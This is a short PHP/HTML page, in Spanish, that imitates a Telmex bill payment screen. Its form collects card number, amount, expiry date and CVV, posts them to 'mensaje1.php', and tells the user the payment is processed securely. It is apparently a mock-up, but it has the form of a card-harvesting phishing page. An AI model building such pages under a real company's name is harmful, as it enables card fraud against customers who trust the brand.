<HTML>

<?php 
require("header.php"); 
?>

</BR> </BR>	<HR> </HR> </BR> </BR>

<CENTER>
<DIV class="div2">

<B style="font-family: Gill Sans MT Condensed; color: royalblue; font-size: 40px;"> TU RECIBO TELMEX </B> <br>
<B style="font-family: Gill Sans MT Condensed; color: royalblue; font-size: 27px;"> Pago con tarjeta </B> <br> <br>

<B style="font-family: Gill Sans MT Condensed; color: CornflowerBlue; font-size: 25px;"> N&uacute;mero Telmex: </B> 1122554439 <br>
<B style="font-family: Gill Sans MT Condensed; color: CornflowerBlue; font-size: 25px;"> Titular de la l&iacute;nea: </B> *NOMBRE DEL TITULAR* <br>
<B style="font-family: Gill Sans MT Condensed; color: CornflowerBlue; font-size: 25px;"> Mes de fracturaci&oacute;n: </B> Noviembre <br>
<B style="font-family: Gill Sans MT Condensed; color: CornflowerBlue; font-size: 25px;"> Pagar antes de: </B> 6/11/2021 <br>
<B style="font-family: Gill Sans MT Condensed; color: CornflowerBlue; font-size: 25px;"> Saldo al corte: </B> $389 <br>

<FORM action="mensaje1.php" method="post">
<br>
<input style="width: 400px;" type="text" name="IMPORTE" class="cajas" required="" placeholder="N&uacute;mero de tarjeta">
<br> <br>
<input style="width: 400px;" type="text" name="IMPORTE" class="cajas" required="" placeholder="Importe a pagar (MXN)">
<br> <br>
<input style="width: 200px;" type="text" name="IMPORTE" class="cajas" required="" placeholder="Fecha de expiraci&oacute;n">

<input style="width: 200px;" type="text" name="IMPORTE" class="cajas" required="" placeholder="CVV">
<br>
<B style="font-family: Gill Sans MT Condensed; font-size: 17px;"> Pago procesado de manera segura </B> 
<br> <br>
  <center>
    <input class="btn" type="submit" name="submit" value="Pagar" onclick="">
  </center>
<br>
  <A> ¿Necesitas ayuda? </A>
  <br>
</FORM>
</DIV>
</CENTER>    
    </BODY>
    
<?php
require("footer.php");
?>
    
</HTML>